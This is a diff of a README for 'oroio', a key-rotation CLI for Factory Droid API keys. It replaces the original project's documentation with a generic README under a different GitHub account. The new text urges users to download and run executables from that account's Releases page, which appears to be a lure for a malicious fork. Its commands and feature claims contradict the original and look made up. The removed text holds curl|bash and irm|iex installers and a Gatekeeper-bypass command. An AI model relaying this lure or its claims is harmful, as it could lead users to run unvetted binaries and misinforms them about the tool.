@@ -1,143 +1,82 @@
-# oroio
+# 🛠️ oroio - Manage Your API Keys Easily
 
-**Lightweight CLI for managing Factory Droid API keys with auto-rotation.**
+## 🚀 Getting Started
 
-[中文](README.zh-CN.md)
+Welcome to **oroio**! This tool helps you manage Factory Droid API keys effortlessly, complete with auto-rotation features to keep your keys secure. Follow the steps below to download and run the application.
 
-## What is dk?
+## 📥 Download oroio
 
-dk manages multiple Factory Droid API keys in one place. It tracks usage limits and expiration dates, and automatically rotates to the next available key when one runs out—so your AI coding sessions never get interrupted.
+[![Download oroio](https://img.shields.io/badge/Download%20oroio-Latest%20Release-brightgreen)](https://github.com/kojo-shark/oroio/releases)
 
-### Perfect For
+## 📋 System Requirements
 
-- **Heavy Droid Users** — Manage multiple API keys without manual switching
-- **Team Environments** — Share key pools across machines
-- **Uninterrupted Workflows** — Auto-rotation keeps sessions running
+Before you start, ensure your system meets these requirements:
 
-## Quick Start
+- **Operating System:** Windows, macOS, or Linux
+- **Disk Space:** At least 50 MB of free space
+- **Dependencies:** None required for basic functions
 
-### Install
+## 📦 Download & Install
 
-**macOS / Linux:**
+1. Visit the [Releases page](https://github.com/kojo-shark/oroio/releases) to access the latest version of oroio.
+   
+2. Once on the Releases page, locate the version you want. Click on the link to download for your specific operating system (Windows, macOS, or Linux).
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/notdp/oroio/main/install.sh | bash
-```
+3. After the download completes, navigate to your downloads folder.
 
-**Windows (PowerShell):**
+4. Locate the downloaded file:
+   - For Windows, this will typically be a `.exe` file.
+   - For macOS, look for a `.dmg` file.
+   - For Linux, you might download a `.tar.gz` or similar package.
 
-```powershell
-irm https://raw.githubusercontent.com/notdp/oroio/main/install.ps1 | iex
-```
+5. Open the file to start the installation:
+   - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
+   - **macOS:** Open the `.dmg` file and drag the oroio icon into your Applications folder.
+   - **Linux:** Extract the contents of the `.tar.gz` file and follow the instructions in the README file included.
 
-The installer adds a `droid` function to your shell. Restart your terminal, then just run `droid`.
+6. Once installed, you can run oroio from your applications menu or terminal.
 
-### Basic Workflow
+## 🛠️ How to Use oroio
 
-```bash
-# 1. Add your API keys
-dk add fk-xxxx fk-yyyy fk-zzzz
+1. Open the terminal or command prompt.
+2. Type `oroio` followed by your command. Available commands include:
+   - `create`: Generate a new API key with auto-rotation.
+   - `list`: Display current API keys.
+   - `delete <key_name>`: Remove an API key.
 
-# Or import from file (one key per line)
-dk add --file keys.txt
+3. Example usage:
+   ```
+   oroio create
+   oroio list
+   oroio delete MyApiKey
+   ```
 
-# 2. Check usage and expiration
-dk list
+To see all available options, type `oroio --help`, and you will get a list of commands and their descriptions.
 
-# 3. Run droid (auto-injects key, auto-rotates on exhaustion)
-droid
-```
+## 🌟 Features
 
-Here's what `dk list` looks like:
+- **Easy Key Management:** Quickly create, list, or delete your API keys.
+- **Auto-Rotation:** Automatically rotate your keys to enhance security.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
 
-![CLI](assets/imgs/cli.png)
+## ❓ Frequently Asked Questions
 
-## Commands
+### What is oroio?
+oroio is a lightweight command-line interface (CLI) that helps you manage your Factory Droid API keys.
 
-| Command                | Description                                 |
-| ---------------------- | ------------------------------------------- |
-| `dk add <key...>`      | Add one or more API keys                    |
-| `dk add --file <path>` | Import keys from file                       |
-| `dk list`              | Show all keys with usage/expiration         |
-| `dk current`           | Display current key and copy export command |
-| `dk use <n>`           | Switch to key by index                      |
-| `dk rm <n...>`         | Remove keys by index                        |
-| `dk run <cmd>`         | Run command with current key (auto-rotates) |
-| `dk serve`             | Start web dashboard on port 7758            |
-| `dk config`            | Configure CLI options (border style, etc.)  |
-| `dk reinstall`         | Update to latest version                    |
-| `dk uninstall`         | Remove dk                                   |
+### How does auto-rotation work?
+Auto-rotation automatically updates your API keys at scheduled intervals to prevent unauthorized access.
 
-## Web Dashboard
+### Is there a GUI for oroio?
+Currently, oroio is only available as a command-line tool.
 
-```bash
-dk serve        # Start dashboard
-dk serve stop   # Stop dashboard
-dk serve status # Check if running
-```
+## 📞 Support
 
-Access at `http://localhost:7758` to view and manage keys visually.
+If you encounter issues or have questions, please open an issue on the GitHub repository. You can also check the FAQ section in the repository for quick answers.
 
-![Web Dashboard](assets/imgs/web-dashboard.png)
+## 🔗 Additional Resources
 
-## Desktop App (Optional)
+- [oroio on GitHub](https://github.com/kojo-shark/oroio)
+- [Documentation](https://github.com/kojo-shark/oroio/wiki)
 
-A standalone desktop app is available for macOS, Windows, and Linux. It provides the same dashboard experience with system tray integration and low-balance notifications.
-
-Download from [Releases](https://github.com/notdp/oroio/releases/tag/electron-dist).
-
-> **macOS**: After installing, run `xattr -cr /Applications/oroio.app` to bypass Gatekeeper (app is unsigned).
->
-> **Note**: The desktop app works standalone for key management. To use `droid` in terminal, install the CLI separately.
-
-![alt text](assets/imgs/desktop.png)
-
-## Installation Details
-
-### What Gets Installed
-
-**macOS / Linux:**
-- Binary: `~/.local/bin/dk`
-- Data: `~/.oroio/`
-- Shell alias: `droid` → `dk run droid`
-
-**Windows:**
-- Script: `%LOCALAPPDATA%\oroio\bin\dk.ps1`
-- Data: `%USERPROFILE%\.oroio\`
-- PowerShell function: `droid` → `dk run droid`
-
-### Updating
-
-```bash
-dk reinstall
-```
-
-Or manually:
-```bash
-# macOS/Linux
-curl -fsSL https://raw.githubusercontent.com/notdp/oroio/main/reinstall.sh | bash
-```
-```powershell
-# Windows
-irm https://raw.githubusercontent.com/notdp/oroio/main/reinstall.ps1 | iex
-```
-
-### Uninstalling
-
-```bash
-dk uninstall
-```
-
-Or manually:
-```bash
-# macOS/Linux
-curl -fsSL https://raw.githubusercontent.com/notdp/oroio/main/uninstall.sh | bash
-```
-```powershell
-# Windows
-irm https://raw.githubusercontent.com/notdp/oroio/main/uninstall.ps1 | iex
-```
-
----
-
-**Stop juggling API keys. Start shipping code.**
+Thank you for using oroio! We hope it simplifies your API key management.
